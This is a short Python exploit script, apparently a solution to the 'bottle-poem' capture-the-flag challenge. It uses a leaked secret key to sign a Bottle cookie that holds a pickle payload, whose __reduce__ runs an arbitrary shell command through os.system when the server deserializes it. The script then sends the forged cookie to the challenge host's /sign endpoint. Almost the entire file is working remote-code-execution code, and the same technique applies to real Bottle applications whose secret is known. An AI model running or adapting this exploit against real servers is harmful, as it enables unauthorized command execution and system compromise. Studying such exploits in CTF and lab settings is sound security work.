#!/usr/bin/env python3

import os
import pickle
import sys

import bottle
import requests

try:
    command = sys.argv[1]
except IndexError:
    print(f"Usage: {sys.argv[0]} <command>")
    sys.exit(1)

target = "bottle-poem.ctf.sekai.team"

# Retrieved from /app/config/secret.py
secret = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"

# Once we have the secret, the main vulnerability lies in bottle's pickle deserialization of
# cookies:
# https://github.com/bottlepy/bottle/blob/df67999584a0e51ec5b691146c7fa4f3c87f5aac/bottle.py#L1217

class PicklePayload:
    def __reduce__(self):
        return os.system, (command,)

bottle.response.set_cookie("name", PicklePayload(), secret=secret)
str_resp = str(bottle.response)
cookie_start_idx = str_resp.find('name="') + len('name="')
cookie_end_idx = str_resp.find('"', cookie_start_idx)
cookie = str_resp[cookie_start_idx:cookie_end_idx]

sess = requests.Session()
sess.cookies.set("name", cookie, domain=target)
r = sess.get(f"http://{target}/sign")
print(r.text)
